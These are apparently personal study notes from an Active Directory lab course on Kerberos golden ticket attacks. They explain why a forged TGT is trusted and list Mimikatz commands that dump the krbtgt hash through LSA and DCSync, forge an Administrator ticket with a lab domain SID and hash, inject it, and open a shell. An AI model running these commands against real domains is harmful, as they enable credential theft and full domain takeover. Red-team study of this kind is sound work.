<center><h2>Golden Ticket Attack</h2></center>

So the main vulnerable trust was at the point

Now KDC decrypts the hash because it has password of krbtgt and *if KDC can decrypt that then whatever is inside that is true*

So with this we can also create golden ticket.

![[2022-02-10 17_51_29-09-DomainPersistence-Part1.mp4 - VLC media player.png]]

- A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket.
	- *If we can forge a TGT and present it to DC then it will see it as a vaild ticket*
	- Only validation is *if DC can decrypt the TGT*
- Si nce user account validation is nott done by Domain Controller (KDC service) until TGT is older than 20 min, we can use even delete/revoked accounts
- *The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine*.
- Password change has no effect on this attack


**So we need access to krbtgt account so that we can forge TGT ticket and send it to DC for Golden Ticket.**

```powershell
# Execute Mimikatz on DC to get krbtgt hash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc

# On any machine
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /krbtgt:<ntlm_hash> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

<center><b>Command</b></center>
![[2022-02-10 18_56_09-09-DomainPersistence-Part1.mp4 - VLC media player.png]]

![[2022-02-10 18_58_12-09-DomainPersistence-Part1.mp4 - VLC media player.png]]


- To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges:
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain_name>\krbtgt"'
```
*Extract krbtgt hash from the DC using DCSync*

- Using DCDync option needs no code execution (no need to run Invoke-Mimikatz) on the target DC.


<center><h2>Golden Ticket from mimikatz</h2></center>
Check for the privileges 
`Privilege '20' OK`

Command used:
```powershell
privilege::debug
```

Now we dump the krbtgt hash

```powershell
lsadump::lsa /inject /name:krbtgt 
```

![[mimikatz golden ticket.png]]
*Highlighted boxes thigs you need*

**Now Create a golden ticket**

Command:
```powershell
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500 
```

**Now you have sucessfully created golden ticket**

Command:
```powershell
# Gives you new command prompt
misc::cmd
```
